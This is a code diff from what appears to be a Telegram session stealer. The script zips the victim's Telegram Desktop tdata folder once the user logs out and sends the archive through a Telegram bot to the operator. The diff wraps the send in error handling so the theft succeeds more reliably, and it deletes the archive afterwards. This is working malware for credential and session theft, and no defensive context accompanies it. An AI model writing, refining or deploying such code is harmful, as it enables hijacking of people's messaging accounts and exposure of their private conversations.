@@ -29,8 +29,13 @@ while telegram_online:
                     z.write(f)
 
         bot.send_message(MY_ID, f"🟢🔓 The user logged out of Telegram Desktop. Sending you the archive file with tdata below.")
-        bot.send_document(MY_ID, open(telegram_zip, 'rb'))
-        os.remove(telegram_zip)
+        try:
+            bot.send_document(MY_ID, open(telegram_zip, 'rb'))
+            os.remove(telegram_zip)
+            break
+        except Exception as e:
+            bot.send_message(MY_ID, f"🟠 Failed to send {telegram_zip} archive: {e}.")
+            pass
         telegram_online = False
     except Exception as e:
         print(e)
